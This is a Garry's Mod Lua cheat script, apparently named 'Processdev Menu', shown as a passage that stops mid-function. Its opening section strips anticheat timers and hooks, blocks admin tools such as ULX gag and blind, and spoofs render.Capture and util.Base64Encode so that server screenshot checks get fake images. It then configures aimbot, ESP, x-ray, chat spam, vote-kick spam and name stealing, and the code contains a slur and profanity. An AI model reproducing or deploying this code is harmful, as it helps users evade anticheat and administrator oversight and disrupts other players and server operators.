if ( SERVER ) then 
function file.Read(d)      
return "Bien essayer Ton menu s'ouvre pas :)"   
end
end
MsgC (Color( 0, 255, 15 ), [[

 __         ______    ______   _______   ______  __    __   ______             
/  |       /      \  /      \ /       \ /      |/  \  /  | /      \            
$$ |      /$$$$$$  |/$$$$$$  |$$$$$$$  |$$$$$$/ $$  \ $$ |/$$$$$$  |           
$$ |      $$ |  $$ |$$ |__$$ |$$ |  $$ |  $$ |  $$$  \$$ |$$ | _$$/            
$$ |      $$ |  $$ |$$    $$ |$$ |  $$ |  $$ |  $$$$  $$ |$$ |/    |           
$$ |      $$ |  $$ |$$$$$$$$ |$$ |  $$ |  $$ |  $$ $$ $$ |$$ |$$$$ |           
$$ |_____ $$ \__$$ |$$ |  $$ |$$ |__$$ | _$$ |_ $$ |$$$$ |$$ \__$$ |__  __  __ 
$$       |$$    $$/ $$ |  $$ |$$    $$/ / $$   |$$ | $$$ |$$    $$//  |/  |/  |
$$$$$$$$/  $$$$$$/  $$/   $$/ $$$$$$$/  $$$$$$/ $$/   $$/  $$$$$$/ $$/ $$/ $$/ 
                                                                               
                                                                               

  ]])
if !( CLIENT ) then return end
if hook.GetTable().zac_110011010110110101101010101 then
hook.Remove( "zac_110011010110110101101010101", "", zac_knwowledge100110110101011 );
end
if hook.GetTable().zac_meme then
hook.Remove( "zac_meme", "", zac_00100101010110110011101 );
end
local RatesScaleLevel = LocalPlayer():SteamID()
if ulx then ulx.showMotdMenu = function() end end
if( ulx ) then
function ulx.showMotdMenu() return end
function ulx.gagUser() return end
if hook.GetTable().HUDPaint then hook.Remove("HUDPaint","drawHudVital") end
if hook.GetTable().CalcView then hook.Remove("CalcView", "CalcView") end
hook.Add( "Think", "naughtyblindxx", function() hook.Remove( "HUDPaint", "ulx_blind" ) end )
end
if( FancyMOTD ) then 
function FancyMOTD.Show() return end
end
if( MODERN != nil ) then
function MODERN.OpenMOTD() return end
end
if( FIGD ) then
function FIGD.OpenMenu() return end 
end
if( silkymotd ) then
function silkymotd.Open() return end
end
net.Receive( "open_menu", function() end )
net.Receive( "closebutton_repeat", function() end )
net.Receive("sMsgStandard", function() end)
net.Receive("sNotifyHit", function() end)
net.Receive("sMsgAdmins", function() end)
net.Receive("sAlertNotice", function() end)
_G.RunCheck = function() end -- RIP hellzone anticheat
timer.Simple(1, function()
if AccountCreationScreen then
AccountCreationScreen:Remove(); -- go fuck yourself
end
hook.Remove("PlayerBindPress", "BlockPhysgunWheelSpeedGlitch") -- no seriously go fuck yourself
end)
if SERVER then return end
concommand.Remove( "DrawDeathMsg" )
concommand.Remove( "EasyMOTD_Open" )
concommand.Remove( "OpenMotd" )
concommand.Remove( "nlr_box" )
concommand.Remove( "NLRDeathMessage" )
concommand.Remove( "wesnlr" )
concommand.Remove( "lunera_motd" )
concommand.Remove( "MOTD" )
concommand.Remove( "MOTDS" )
concommand.Remove( "Suss_MOTD" )
-- Fuck Escape Menu
hook.Remove("ShouldDrawLocalPlayer", "ESC.DrawPlayer")
hook.Remove("HUDShouldDraw", "ESC.HideHUD")
hook.Remove("RenderScreenspaceEffects", "ESC.ScreenspaceEffects")
hook.Remove("PreRender", "ESC.OpenMenu")
hook.Remove("CalcView", "ESC.CalcView")
hook.Remove("HUDShouldDraw", "IceEscape_HudShouldDraw")
hook.Remove("Render", "IceEscape_CheckKeyWasIn")
hook.Remove("PreRender", "IceEscape_PreRenderHookEscKey")
hook.Remove("PreRender", "esc.PreRender")
hook.Remove("Think", "JarvinOpenKey")
hook.Remove("PreRender", "Jarvin:PreRender")
hook.Remove("PreRender", "Liko:PreRender")
hook.Remove("PreRender", "cleanEscape")
hook.Remove("RenderScreenspaceEffects", "ceScreenEffects")
if file.Exists( "autorun/client/cl_3dmenu.lua", "LUA" ) == true then
hook.Remove( "PostDrawTranslucentRenderables", MENU )
hook.Remove( "RenderScene", MENU )
hook.Remove( "Think", MENU )
hook.Remove( "GUIMousePressed", MENU )
hook.Remove( "PreventScreenClicks", MENU )
hook.Remove( "ShouldDrawLocalPlayer", MENU )
hook.Remove( "CalcView", MENU )
hook.Remove( "PreRender", MENU )
hook.Remove( "HUDShouldDraw", MENU )
MENU = nil
end
-- Photon de merde buger
hook.Remove( "PreDrawEffects", "Photon.RenderQueue")
-- J'ai galerer pour cette merde mes enfin sa dégage mdr
hook.Remove("HUDPaint", "carBomb_ScannerHUD")
-- Escape Menu Fucked x)
-- Fuck Weather
--atmos :
hook.Remove( "Think", "atmosStormThink" )
hook.Remove( "HUDPaint", "atmosHUDPaint" )
--simpleweather
hook.Remove( "Initialize", "SW.Initialize" )
hook.Remove( "Think", "SW.Think" )
hook.Remove( "HUDPaint", "SW.HUDPaint" )
hook.Remove( "RenderScreenspaceEffects", "SW.RenderScreenspaceEffects" )
hook.Remove( "SetupWorldFog", "SW.SetupWorldFog" )
hook.Remove( "SetupSkyboxFog", "SW.SetupSkyboxFog" )
hook.Remove( "HUDPaint", "SW.DrawClock" )
--stormfox
hook.Remove("Think","StormFox - Outdoor Env" )
hook.Remove("Think","StormFox - light_env support" )
hook.Remove("HUDPaint","RainDebug2" )
hook.Remove("HUDPaint","StormFox - HUDTips" )
hook.Remove("RenderScreenspaceEffects","StormFox - Toxxeffect" )
hook.Remove("PostDraw2DSkyBox", "StormFox - SkyBoxRender" )
hook.Remove( "StormFox - TopSkyRender", "StormFox - MoonRender" )
hook.Remove( "RenderScreenspaceEffects", "StormFox - Sunbeams" )
hook.Remove("StormFox - EnvUpdate","StormFox - RainSounds" )
hook.Remove("StormFox - EnvUpdate","StormFox - WindSounds" )
hook.Remove("Think","StormFox - SkyPaintFix" )
hook.Remove("Think","StormFox - SkyThink" )
hook.Remove( "PostDraw2DSkyBox", "StormFox - ShootingStars" )
hook.Remove("Think","StormFox - ShadowUpdate" )
hook.Remove( "RenderScreenspaceEffects", "stormFox - screenmodifier" )
hook.Remove("Think","StormFox - DownfallUpdater" )
hook.Remove("Think","StormFox - RenderFalldownThink" )
hook.Remove("Think","StormFox - RenderFalldownScreenThink" )
hook.Remove("HUDPaint","StormFox - RenderRainScreen" )
hook.Remove("HUDPaint","StormFox - RainScreenEffect" )
hook.Remove("Think","StormFox - RenderFalldownHanlde" )
hook.Remove("PostDrawTranslucentRenderables", "StormFox - RenderFalldown" )
hook.Remove("PostPlayerDraw","StormFox - Breath" )
hook.Remove("Think","StormFox - CBreath" )
hook.Remove("SetupSkyboxFog","StormFox - skyfog" )
hook.Remove("SetupWorldFog","StormFox - skyworldfog" )
hook.Remove("RenderScene","StormFox - Suntest" )
hook.Remove("PostDrawOpaqueRenderables","StormFox - SkyBox Debug" )
hook.Remove("Think","StormFox - CloudUpdate" )
hook.Remove("PostDrawOpaqueRenderables","StormFox - CloudRender" )
-- Weather Fucked
if ConVarExists( "utime_enable") then
RunConsoleCommand("utime_enable",0)
end
RunConsoleCommand("-voicerecord")
hook.Remove("HUDPaint", "PPT_HUD")
hook.Remove("InitPostEntity", "spawnIconRefresh")
hook.Remove("HUDPaint", "DoHud")
hook.Remove("Think", "PlayerInfoThing")            
timer.Destroy("AntiCheatTimer")            
timer.Destroy("testing123")            
hook.Remove("Think", "sh_menu")   
timer.Destroy( "STC" )      
hook.Remove("PlayerInitialSpawn", "AddPlayer")      
hook.Remove("OnGamemodeLoaded", "___scan_g_init")      
hook.Remove("PlayerSay", "screengrab_playersay")       
hook.Remove( "PlayerInitialSpawn", "showMotd")
hook.Remove( "CalcView", "rp_deathPOV" )
hook.Remove( "PlayerBindPress", "BlockPhysgunWheelSpeedGlitch" )
hook.Remove( "Think", "FancyMOTD.OpenOnKeypress" )
hook.Remove( "RenderScreenspaceEffects", "WeatherOverlay" )
hook.Remove( "PlayerInitialSpawn", "OpenMotdOnJoin" )
hook.Remove( "PlayerSay", "OpenMotdOnCommand" )
hook.Remove( "Initialize","silkymotd" )
hook.Remove( "PlayerAuthed", "wat" )
hook.Remove( "HUDPaint", "newhud" )
hook.Remove( "HUDShouldDraw", "newhud" )
hook.Remove( "Think", "wat" )
hook.Remove( "RenderScreenspaceEffects", "wat" )
hook.Remove( "HUDPaint", "dance" )
hook.Remove( "GetMotionBlurValues", "wat" )
hook.Remove( "RenderScreenspaceEffects", "ohgod" )
hook.Remove( "PostDrawTranslucentRenderables", "ohgod" )
timer.Destroy( "thedrop" )
net.Receive( "open_menu", function() end )
net.Receive( "LuneraInitMenu", function() end )
net.Receive( "closebutton_repeat", function() end )
net.Receive( "sBlockGMSpawn", function() hook.Remove( "PlayerBindPress", "_sBlockGMSpawn" ) end )
net.Receive( "NDS_death", function() return end )
net.Receive( "silkymotd", function() return end )
net.Receive( "slua", function() return end )
local missingjpg = file.Read("materials/ironman.jpg", "GAME")
local missingpng = file.Read("materials/ironman.png", "GAME")
local noided_dummy = "iVBORw0KGgoAAAANSUhEUgAAAAcAAAAECAIAAADNpLIqAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAYSURBVBhXY2BgYmBmYGFgZEAFlIkyMAAACDAAKdIBq3cAAAAASUVORK5CYII="
local actualRenderCapture = _G.render.Capture
local encodeData    = util.Base64Encode;
_G.render.Capture = function(data)
chat.AddText( Color(0, 255, 255), "[Processdev Menu v1.7]: Tentative de Screenshot Bloquer" )
if data.format == "jpeg" then
return missingjpg
elseif data.format == "png" then
return missingpng
end
end
util.Base64Encode = function( str )
local encoding = encodeData( missingpng );
return( noided_dummy );
end
local RunCmdAlt = http.Fetch
timer.Destroy("animating")
animating = false
local ZNX = ZNX or {}
ZNX.Vars = ZNX.Vars or {}
ZNX.NumberVars = ZNX.NumberVars or {} -- need a seperate table here coz im a lazy cunt
ZNX.Buddies = ZNX.Buddies or {}
ZNX.Targets = ZNX.Targets or {}
ZNX.TheyHaveEyesEverywhere = ZNX.TheyHaveEyesEverywhere or {}
ZNX.Witnesses = ZNX.Witnesses or {}
ZNX.Debug = ZNX.Debug or {}
ZNX.MarkedEnts = ZNX.MarkedEnts or {}
ZNX.RenderPanic = false
ZNX.NameStealName = "Changer de Nom"
ZNX.NameStealPlayer = LocalPlayer()
ZNX.CrossHairAlpha = 0
ZNX.ScrollDelta = 0 -- lets you set mouse wheel scroll from outside of createmove
ZNX.AimbotBone = "ValveBiped.Bip01_Head1"
ZNX.ViewAngle = Angle(0,0,0)
ZNX.AimbotTarget = game.GetWorld()
ZNX.AimbotPreviewTarget = -1
ZNX.HoldingProp = game.GetWorld()
ZNX.ChatSpamText = "@PrenezProcessdevMenu"
ZNX.OPhysColor = Vector( GetConVarString( "cl_weaponcolor" ) ) or Vector( 1,1,1 )
ZNX.CurrentBase = 0
ZNX.BaseAreaSize = 10
ZNX.InternalFakeAngles = 0
ZNX.MemoryDebug = {
["hud"] = 0,
["logic"] = 0,
["aimbot"] = 0,
}
ZNX.Freecam = false
ZNX.FreecamCoordinates = { pos = Vector( 0, 0, 0 ), ang = Angle( 0, 0, 0 ) }
-- general settings
ZNX.Vars.Notifications = ZNX.Vars.Notifications or true
-- vision
ZNX.Vars.Vision = ZNX.Vars.Vision or true
ZNX.Vars.ShowESP = ZNX.Vars.ShowESP or true
ZNX.Vars.ShowDead = ZNX.Vars.ShowDead or false
ZNX.Vars.ShowHP = ZNX.Vars.ShowHP or false
ZNX.Vars.ShowFriends = ZNX.Vars.ShowFriends or true
ZNX.Vars.ShowTargets = ZNX.Vars.ShowTargets or true
ZNX.Vars.TeamColors = ZNX.Vars.TeamColors or false
ZNX.Vars.ShowRanks = ZNX.Vars.ShowRanks or true
ZNX.Vars.ShowDistance = ZNX.Vars.ShowDistance or false
ZNX.Vars.ESPProps = ZNX.Vars.ESPProps or false
ZNX.Vars.Entfinder = ZNX.Vars.Entfinder or false
ZNX.Vars.Vizlines = ZNX.Vars.Vizlines or false
ZNX.Vars.BoundingBox = ZNX.Vars.BoundingBox or false
ZNX.Vars.BoundingBox3d = ZNX.Vars.BoundingBox3d or false
ZNX.Vars.VSquares = ZNX.Vars.VSquares or true
ZNX.Vars.VNames = ZNX.Vars.VNames or true
ZNX.Vars.PKVelocity = ZNX.Vars.PKVelocity or false
ZNX.Vars.PKChams = ZNX.Vars.PKChams or false
ZNX.Vars.PKPropCam = ZNX.Vars.PKPropCam or false
ZNX.Vars.PKPropBeams = ZNX.Vars.PKPropBeams or false
ZNX.Vars.PKPlayerBeams = ZNX.Vars.PKPlayerBeams or false
ZNX.Vars.PKVerticalBeams = ZNX.Vars.PKVerticalBeams or false
ZNX.Vars.CSFlashlight = ZNX.Vars.CSFlashlight or false
ZNX.Vars.ArmeESP = ZNX.Vars.ArmeESP or false
ZNX.Vars.ArgentESP = ZNX.Vars.ArgentESP or false
ZNX.Vars.ShowFPS = ZNX.Vars.ShowFPS or false
ZNX.NumberVars.VisionDist = ZNX.NumberVars.VisionDist or 2000
-- utility
ZNX.Vars.CameraSpam = ZNX.Vars.CameraSpam or true
ZNX.Vars.FlashlightSpam = ZNX.Vars.FlashlightSpam or false
ZNX.Vars.NoRecoil = ZNX.Vars.NoRecoil or true
ZNX.Vars.WitnessDetector = ZNX.Vars.WitnessDetector or false
ZNX.Vars.Mirror = ZNX.Vars.Mirror or false
ZNX.Vars.Radar = ZNX.Vars.Radar or false
--ZNX.Vars.RadarColors = ZNX.Vars.RadarColors or false
ZNX.Vars.Xray = ZNX.Vars.Xray or false
ZNX.Vars.Crosshair = ZNX.Vars.Crosshair or false
ZNX.Vars.NameStealer = false
ZNX.Vars.NotifyKills = ZNX.Vars.NotifyKills or false
ZNX.Vars.XrayPlayers = ZNX.Vars.XrayPlayers or true
ZNX.Vars.XrayProps = ZNX.Vars.XrayProps or true
ZNX.Vars.XrayEntfinder = ZNX.Vars.XrayEntfinder or false
ZNX.Vars.NoChamColours = ZNX.Vars.NoChamColours or true
ZNX.Vars.XraySolid = ZNX.Vars.XraySolid or false
ZNX.Vars.AutoAddSteamFriends = ZNX.Vars.AutoAddSteamFriends or true
ZNX.Vars.ChatSpam = false
ZNX.Vars.ChatSpamOOC = ZNX.Vars.ChatSpamOOC or false
ZNX.Vars.ChatSpamBind = ZNX.Vars.ChatSpamBind or false
ZNX.Vars.ChatSpamInsult = ZNX.Vars.ChatSpamInsult or false
ZNX.Vars.ChatSpamPM = ZNX.Vars.ChatSpamPM or false
ZNX.Vars.ChatSpamPMAdmins = ZNX.Vars.ChatSpamPMAdmins or false
ZNX.EntScanner = false
ZNX.EntScannerTab = {}
ZNX.EntScannerEnt = game.GetWorld()
ZNX.Vars.DemoteSpam = false
ZNX.Vars.WantedSpam = false
ZNX.Vars.ULXVotekickSpam = false
ZNX.Vars.ULXVotebanSpam = false
ZNX.Vars.KillTaunts = false
ZNX.Vars.DeathTaunts = false
ZNX.Vars.DodgeArrest = false
ZNX.Vars.NewLifeRule = false
ZNX.Vars.DontTouchMeThere = false
ZNX.Vars.KeypadJew = false
ZNX.Vars.FreecamControls = false
-- aimbot
ZNX.Vars.Aimbot = ZNX.Vars.Aimbot or false
ZNX.Vars.AimbotTargetMode = ZNX.Vars.AimbotTargetMode or true
ZNX.Vars.AutoShoot = ZNX.Vars.AutoShoot or false
ZNX.Vars.AimbotShootThroughWalls = ZNX.Vars.AimbotShootThroughWalls or false
ZNX.Vars.SnapOnFire = ZNX.Vars.SnapOnFire or false
ZNX.Vars.TargetFriends = ZNX.Vars.TargetFriends or true
ZNX.Vars.TargetHighlighted = ZNX.Vars.TargetHighlighted or true
ZNX.Vars.TargetNormies = ZNX.Vars.TargetNormies or true
ZNX.Vars.TargetAdmins = ZNX.Vars.TargetAdmins or true
ZNX.Vars.TargetSameTeam = ZNX.Vars.TargetSameTeam or true
ZNX.Vars.TargetNoclippers = ZNX.Vars.TargetNoclippers or true
ZNX.Vars.PreviewTarget = ZNX.Vars.PreviewTarget or true
ZNX.Vars.CompSpread = ZNX.Vars.CompSpread or false
ZNX.Vars.SilentAim = ZNX.Vars.SilentAim or false
ZNX.Vars.AimbotBindMode = ZNX.Vars.AimbotBindMode or false
ZNX.Vars.SafeJump = ZNX.Vars.SafeJump or false
ZNX.Vars.AimbotWallbanger = ZNX.Vars.AimbotWallbanger or false
ZNX.Vars.AimbotAdaptiveTarget = ZNX.Vars.AimbotAdaptiveTarget or false
ZNX.Vars.AimbotStickyLock = ZNX.Vars.AimbotStickyLock or true
ZNX.Vars.TargetMurder = ZNX.Vars.TargetMurder or false
ZNX.Vars.AutoReload = ZNX.Vars.AutoReload or false
ZNX.NumberVars.AimbotMaxFOV = ZNX.NumberVars.AimbotMaxFOV or 20
ZNX.NumberVars.AimbotDist = ZNX.NumberVars.AimbotDist or 200
ZNX.NumberVars.AimbotSmooth = ZNX.NumberVars.AimbotSmooth or 0
ZNX.NumberVars.PKRotateAngle = ZNX.NumberVars.PKRotateAngle or 30
ZNX.NumberVars.AimbotBindKey = ZNX.NumberVars.AimbotBindKey or 107
ZNX.NumberVars.SafeJumpBindKey = ZNX.NumberVars.SafeJumpBindKey or 24
ZNX.NumberVars.FreecamForward = ZNX.NumberVars.FreecamForward or 50
ZNX.NumberVars.FreecamBack = ZNX.NumberVars.FreecamBack or 49
ZNX.NumberVars.FreecamLeft = ZNX.NumberVars.FreecamLeft or 41
ZNX.NumberVars.FreecamRight = ZNX.NumberVars.FreecamRight or 43
ZNX.NumberVars.FreecamUp = ZNX.NumberVars.FreecamUp or 45
ZNX.NumberVars.FreecamDown = ZNX.NumberVars.FreecamDown or 42
-- default menu and esp colours
ZNX.DefaultSchemes = {
[1] = {"Anus Brown", Color(125,0,0), Color(50,0,0)},
[2] = {"Ocean Blue", Color(100,100,255,255), Color(50,50,155,255)},
[3] = {"Sage Green", Color(100,250,100,255), Color(0,200,0,255)},
[4] = {"Javelin Orange", Color(250,250,0,255), Color(250,150,0,255)},
[5] = {"Predator Red", Color(255,0,0,255), Color(200,0,0,255)},
[6] = {"Miami Pink", Color(255,0,255,255), Color(150,0,150,255)},
[7] = {"Spectral Blue", Color(205,205,255,255), Color(105,105,255,255)},
[8] = {"Jungle Green", Color(50,150,50,255), Color(0,50,0,255)},
[9] = {"Noir Grey", Color(150,150,150,255), Color(50,50,50,255)},
}
ZNX.DefaultScheme = Color(125,0,0)
ZNX.DefaultScheme2 = Color(255,80,80)
ZNX.Matinfo = {
["$basetexture"] = "models/debug/debugwhite",
["$model"]       = 1,
["$nocull"]      = 1,
["$ignorez"] = 1,
}
ZNX.Mat1 = (CreateMaterial( "abchams2", "VertexLitGeneric", ZNX.Matinfo )) 
ZNX.ColScheme = Vector(ZNX.DefaultScheme.r / 255, ZNX.DefaultScheme.g / 255, ZNX.DefaultScheme.b / 255)
ZNX.ColScheme2 = Vector(ZNX.DefaultScheme2.r / 255, ZNX.DefaultScheme2.g / 255, ZNX.DefaultScheme2.b / 255)
ZNX.NumberVars.ColorScheme = ZNX.NumberVars.ColorScheme or 1
-- herkz
ZNX.Vars.Aimbot = ZNX.Vars.Aimbot or false
ZNX.Vars.Autoclick = ZNX.Vars.Autoclick or false
ZNX.Vars.Bhop = ZNX.Vars.Bhop or false
ZNX.Vars.NPC_ESP = ZNX.Vars.NPC_ESP or false
ZNX.Vars.BhopAutostrafe = ZNX.Vars.BhopAutostrafe or false
ZNX.Vars.RopeStorm = ZNX.Vars.RopeStorm or false
ZNX.Vars.Triggerbot = ZNX.Vars.Triggerbot or false
ZNX.Vars.Thirdperson = ZNX.Vars.Thirdperson or false
ZNX.NumberVars.MirrorX = ZNX.NumberVars.MirrorX or 0
ZNX.NumberVars.MirrorY = ZNX.NumberVars.MirrorY or 0
ZNX.NumberVars.MirrorSize = ZNX.NumberVars.MirrorSize or 30
ZNX.NumberVars.MirrorAxis = ZNX.NumberVars.MirrorAxis or 0
ZNX.NumberVars.XrayDistance = ZNX.NumberVars.XrayDistance or 200
ZNX.NumberVars.TPSDistance = ZNX.NumberVars.TPSDistance or 100
ZNX.NumberVars.AreaScrollerSize = ZNX.NumberVars.AreaScrollerSize or 10
ZNX.NumberVars.TPSOffset = ZNX.NumberVars.TPSOffset or 0
ZNX.NumberVars.RadarX = ZNX.NumberVars.RadarX or ScrW() - 1170
ZNX.NumberVars.RadarY = ZNX.NumberVars.RadarY or 55
ZNX.NumberVars.RadarAlpha = ZNX.NumberVars.RadarAlpha or 255
ZNX.NumberVars.RadarSize = ZNX.NumberVars.RadarSize or 183
ZNX.NumberVars.RadarZoom = ZNX.NumberVars.RadarZoom or 30
statutautoexploit = "Désactiver"
animatinginfo = "Désactiver"  
info_ulx_spam = "Désactiver"   
spam_props_text = "Désactiver"  
billet_spam = "Désactiver"  
local black                                     = ( Color(0,0,0,255) )
local white                                     = ( Color(255,255,255,255) )
local red                                       = ( Color(255,0,0,255) )
local AA = {}
local ValidEntity = IsValid
--[[
local plymeta = FindMetaTable( "Player" )
plymeta.ConCommand2 = plymeta.ConCommand2 or plymeta.ConCommand
function plymeta:ConCommand( command )
if command == "jpeg" and ZNX.Vars.CameraSpam then return else
return self:ConCommand2( command )
end
end
--]]
local ncomponent = { color = Color( 205, 205, 255 ), name = "Processdev" }
function ZNX.ChatText( message, col )
chat.AddText( Color(190, 190, 190), [[[Process Menu]: ]], col, message )
end
function ChatPrint ( msg, color )
chat.AddText ( Color( 190, 190, 190 ), "[Process Menu] "..msg )
end
function DrawOutlinedText ( title, font, x, y, color, OUTsize, OUTcolor )
draw.SimpleTextOutlined ( title, font, x, y, color, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, OUTsize, OUTcolor )
end
function DrawOutlinedText2 ( title, font, x, y, color, OUTsize, OUTcolor )
draw.SimpleTextOutlined ( title, font, x, y, color, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER, OUTsize, OUTcolor )
end
function DrawRoundedBox ( bordersize, x, y, sX, sY, color )
draw.RoundedBox ( bordersize, x, y, sX, sY, color )
end
function DrawRoundedBoxEx ( bordersize, x, y, sX, sY, color, Topl, Topr, Botl, Botr )
draw.RoundedBoxEx ( bordersize, x, y, sX, sY, color, Topl, Topr, Botl, Botr )
end
function DrawLine ( bX, bY, eX, eY )
surface.DrawLine ( bX, bY, eX, eY )
end
function DrawOutlinedRect (color, bx, by, ex, ey )
surface.SetDrawColor (color)
surface.DrawOutlinedRect ( bx, by, ex, ey )
end
function CreateButton ( title, Parent, tcolor, bcolor, visible, x, y, sX, sY, tip, doclick )
local button = vgui.Create( "DButton" )
button:SetParent( Parent ) 
button:SetText( " " )
button:SetPos( x, y )
button:SetSize( sX, sY )
button:SetVisible( visible )
button:SetColor( tcolor )
button:SetTooltip( tip or " " )
button.Paint = function ()
DrawRoundedBoxEx ( 10, 0, 0, button:GetWide(), button:GetTall(), bcolor, false, false, false, false )
DrawOutlinedText ( title, "Menu", button:GetWide()/2, button:GetTall()-10, white, 1, black )
DrawOutlinedRect (red, 0, 0, button:GetWide(), button:GetTall() )
end
button.DoClick = doclick
end
------------------------------------------------------------------------Lokidev UTILITIES--------------------------------------------------------------------------------------
surface.CreateFont("Menu",{font = "Arial", size = 17, weight = 200, antialias = 0})
surface.CreateFont("Get",{font = "Fixedsys", size = 17, weight = 200, antialias = 0})
surface.CreateFont("Small",{font = "Arial", size = 12, weight = 200, antialias = 0})
surface.CreateFont("ESP",{font = "Fixedsys", size = 12, weight = 200, antialias = 0})
surface.CreateFont("Logo",{font = "Tahoma", size = 20, weight = 100000, antialias = 0})
surface.CreateFont("Playlist",{font = "Tahoma", size = 15, weight = 100000, antialias = 0})
surface.CreateFont("HUDLogo",{font = "Ravie", size = 40, weight = 100000, antialias = 0})
surface.CreateFont("Infotab",{font = "Ravie", size = 75, weight = 100000, antialias = 0})
surface.CreateFont( "Fontnpcesp", {font = "Fixedsys", size = 13, weight = 500, antialias = true, outline = true})
function ZNX.SaveSettings()
local StringToWrite = ""
for k, v in pairs(ZNX.Vars) do
if( StringToWrite == "" ) then
StringToWrite = k .. ";" .. tostring(v)
else
StringToWrite = StringToWrite .. "\n" .. k .. ";" .. tostring(v)
end
end
StringToWrite = StringToWrite.."--NUMBERVARS--\n"
for k, v in pairs(ZNX.NumberVars) do
if( StringToWrite == "" ) then
StringToWrite = k .. ";" .. tostring(v)
else
StringToWrite = StringToWrite .. "\n" .. k .. ";" .. tostring(v)
end
end
--[[
if not file.IsDir("Lokidev", "DATA") then
file.CreateDir("Lokidev")
end
--]]
file.Write( "Lokidev_settings.dat", StringToWrite )
end
concommand.Add("LokiDev_save_settings", ZNX.SaveSettings)
function ZNX.LoadSettings()
--[[
if not file.IsDir("Lokidev", "DATA") then
file.CreateDir("Lokidev")
end
--]]
if !file.Exists("Lokidev_settings.dat", "DATA") then ZNX.SaveSettings() return end
local TheFile = file.Read( "Lokidev_settings.dat", "DATA" )
local halves = string.Explode( "--NUMBERVARS--\n", TheFile )
if !halves[2] then file.Delete( "Lokidev_settings.dat" )
ZNX.ChatText( "le fichier de données invalides utilisent un format obsolète! tapez LokiDev_save_settings dans la console pour résoudre ce problème", Color(255,205,205) )
return 
end
TheFile = halves[1]
local DataPieces = string.Explode( "\n", TheFile )
for k, v in pairs( DataPieces ) do
local TheLine = string.Explode( ";", v )
ZNX.Vars[TheLine[1]] = tobool(TheLine[2])
end
TheFile = halves[2]
local DataPieces = string.Explode( "\n", TheFile )
for k, v in pairs( DataPieces ) do
local TheLine = string.Explode( ";", v )
ZNX.NumberVars[TheLine[1]] = tonumber(TheLine[2])
end
ZNX.Vars.NameStealer = false
end
concommand.Add("LokiDev_load_settings", ZNX.LoadSettings)
ZNX.LoadSettings() -- load our shit right away
ZNX.Vars.ChatSpam = false -- reset this to false so we dont get cucked by anticheats
-- covert source units(inches) to metres
function ZNX.ToMetric( num )
if not isnumber(num) then return end
return math.floor(num * 0.0254)
end
function Visible( ply )
if (!IsValid( ply )) then return false end
local vecPos, _ = ply:GetBonePosition( ply:LookupBone( "ValveBiped.Bip01_Head1" ) or 12 );
local trace = { start = LocalPlayer():EyePos(), endpos = vecPos, filter = LocalPlayer(), mask = MASK_SHOT };
local traceRes = util.TraceLine( trace );
TraceRes = traceRes;
if (traceRes.HitWorld || traceRes.Entity != ply) then return false end;
return true;
end
-- check if an entity is actually visible on our screen, used to boost efficiency in the xray and esp code
function ZNX.OnScreen( ent, ws )
local ws = ws or 0
local bpos = (ent:LocalToWorld(ent:OBBCenter())):ToScreen()
if ( bpos.x < (ScrW() + ws) and bpos.x > (0 - ws) and bpos.y < (ScrH() + ws) and bpos.y > (0 - ws) ) then return true end
return false
end
function ZNX.IsDead( ply )
if !ply:IsValid() or !ply:Alive() or ply:GetObserverMode() != OBS_MODE_NONE then return true end
return false
end
-- compatible with ulx, assmod, evolve, vermillion 2 and traditional admin/superadmin detection may or may not pick up unknown admin mods
function ZNX.GetRank( ply )
if !ply or !ply:IsValid() then return "user" end
local rank = "user"
if ply:GetNWString("usergroup") then rank = ply:GetNWString("usergroup") return rank end
--if evolve then rank = ply:EV_GetRank() return rank end
if ply:GetNetworkedString( "UserGroup" ) then rank = ply:GetNetworkedString( "UserGroup" ) return rank end
if ply:GetNWString("Vermilion_Rank") then rank = ply:GetNWString("Vermilion_Rank") return rank end
if ply:IsSuperAdmin() then rank = "SUPERADMIN" return rank end
if ply:IsAdmin() then rank = "ADMIN" return rank end
return rank -- if they aren't any kind of admin that we know of then this will return "user"
end
function ZNX.GetESPColor( ply )
local col1, col2 = ZNX.DefaultScheme, ZNX.DefaultScheme2
if ZNX.IsTarget( ply ) then
col1, col2 = Color(255,205,0,255), Color(205,160,0,255)
return col1, col2
end
if ZNX.IsFriend( ply ) then
col1, col2 = Color(0,255,0,255), Color(100,250,100,255)
return col1, col2
end
if ZNX.GetRank( ply ) != "user" then
col1, col2 = Color(255,100,0,255), Color(255,50,0,255)
return col1, col2
end
if ZNX.Vars.TeamColors then
col1 = team.GetColor(ply:Team())
col2 = Color(math.Clamp(col1.r - 100, 0, 255), math.Clamp(col1.g - 100, 0, 255), math.Clamp(col1.b - 100, 0, 255), 255)
return col1, col2
end
return col1, col2
end
-- friends and targets system
function ZNX.AddTarget( ply )
if !ply or !ply:IsValid() then return end
if table.HasValue( ZNX.Targets, ply ) then return end
table.insert( ZNX.Targets, ply )
ZNX.DebugLog( ply:Nick().."Ajouter a votre liste de cibles", Color( 250, 150, 50) )
end
function ZNX.RemoveTarget( ply )
if !ply or !ply:IsValid() then return end
if not table.HasValue( ZNX.Targets, ply ) then ZNX.ChatText( ply:Nick().." n'est pas une cibles", Color(255,205,205) ) return end
table.RemoveByValue( ZNX.Targets, ply )
ZNX.DebugLog( ply:Nick().." Retirer de votre liste de cibles", Color( 250, 150, 50) )
end
function ZNX.IsTarget( ply )
if !ply or !ply:IsValid() then return false end
return table.HasValue( ZNX.Targets, ply )
end
function ZNX.IsFriend( ply )
if !ply or !ply:IsValid() then return false end
return table.HasValue( ZNX.Buddies, ply )
end
function ZNX.AddFriend( ply )
if !ply:IsValid() then return end
if table.HasValue( ZNX.Buddies, ply ) then return end
table.insert( ZNX.Buddies, ply )
ZNX.DebugLog( ply:Nick().." Ajouter a votre liste d'amis'", Color( 50, 250, 50) )
end
function ZNX.RemoveFriend( ply )
if !ply:IsValid() then return end
if not table.HasValue( ZNX.Buddies, ply ) then ZNX.ChatText( ply:Nick().." n'est pas dans votre liste d'amis", Color(255,205,205) ) return end
table.RemoveByValue( ZNX.Buddies, ply )
ZNX.DebugLog( "Vous avez enlever "..ply:Nick().." de votre liste d'amis", Color( 50, 250, 50) )
end
function ZNX.RemoveInvalidFriends()
for k, v in pairs(ZNX.Buddies) do
if !v:IsValid() then table.remove( ZNX.Buddies, k ) end
end
end
gameevent.Listen( "player_spawn" )
hook.Add( "Think", "addsteamfriends", function()
local plys = player.GetAll()
